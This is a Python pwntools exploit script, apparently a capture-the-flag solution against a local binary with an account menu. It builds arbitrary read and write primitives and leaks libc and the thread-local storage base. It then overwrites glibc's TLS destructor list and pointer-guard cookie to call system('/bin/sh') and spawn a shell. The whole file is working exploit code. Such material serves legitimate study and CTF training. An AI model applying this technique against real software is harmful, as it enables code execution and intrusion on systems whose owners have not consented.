#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './chall', checksec=False)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

context.log_level = 'warning'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

io = start()

def sla(a, b): return io.sendlineafter(a, b)
def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def rlu(a): return io.recvuntil(a)
def rl(): return io.recvline()

def itb(num: int): return str(num).encode()

def create_account(idx: int, name: bytes, passw: bytes):
    sla(b'> ', itb(1))
    sl(itb(idx))
    s(name)
    sl(passw)

def print_account(idx: int):
    sla(b'> ', itb(2))
    sla(b'> ', itb(idx))

def update_account(idx: int, name: bytes, passw: bytes):
    sla(b'> ', itb(3))
    sla(b'> ', itb(idx))
    sl(name)
    s(passw)

def exit():
    sla(b'> ', itb(4))

def setup_arb(idx: int, addr: int):
    payload = flat(0xdeadbeef) * 2 + p32(idx) + p32(0x1) + flat(addr)
    log.info(f"Creating payload with length: {len(payload)}")
    return payload 

def arb_read(idx: int, addr: int):
    create_account(idx, setup_arb(idx+1, addr), b'AAAA')
    print_account(idx+1)
    rlu(b'a es: ')
    return u64(rl().split(b'Elige')[0].strip().ljust(8, b'\x00'))

def arb_write(idx: int, addr: int, payload: bytes):
    create_account(idx, setup_arb(idx+1, addr), b'AAAA')
    update_account(idx+1, DEFAULT_NAME, payload)


DEFAULT_NAME = b'name'

# leak libc from binary
puts = arb_read(0, exe.got.puts)
libc.address = puts - libc.sym.puts
print(f"[*] libc leak   :   0x{libc.address:x}")

# leak tls storage from libc
_rtld_global = arb_read(2, libc.sym['__nptl_rtld_global'])
_ns_loaded = arb_read(4, _rtld_global)
tls = _ns_loaded - 0x502e0

print(f"[*] _rtld_global    :   0x{_rtld_global:x}")
print(f"[*] _ns_loaded    :   0x{_ns_loaded:x}")
print(f"[*] tls base    :   0x{tls:x}")

# Modify dtor_list
tls_target = tls + 0x6e8 # offset checked by placing a breakpoint in __call_tls_dtors
tls_func = tls_target + 8
tls_cookie = tls + 0x770

## Final dtor_list setup:
##  0x6e8 : tls_func (0x6f0)
##  0x6f0 : system() 
##  0x6f8 : "/bin/sh"

arb_write(6, tls_target, flat(tls_func))
arb_write(8, tls_cookie, flat(0x0))
arb_write(10, tls_func, flat(libc.sym.system << 17) + flat(next(libc.search(b'/bin/sh\x00')))[:6])

rlu(b'> ')
rlu(b'> ')
rlu(b'> ')

exit()

io.interactive()

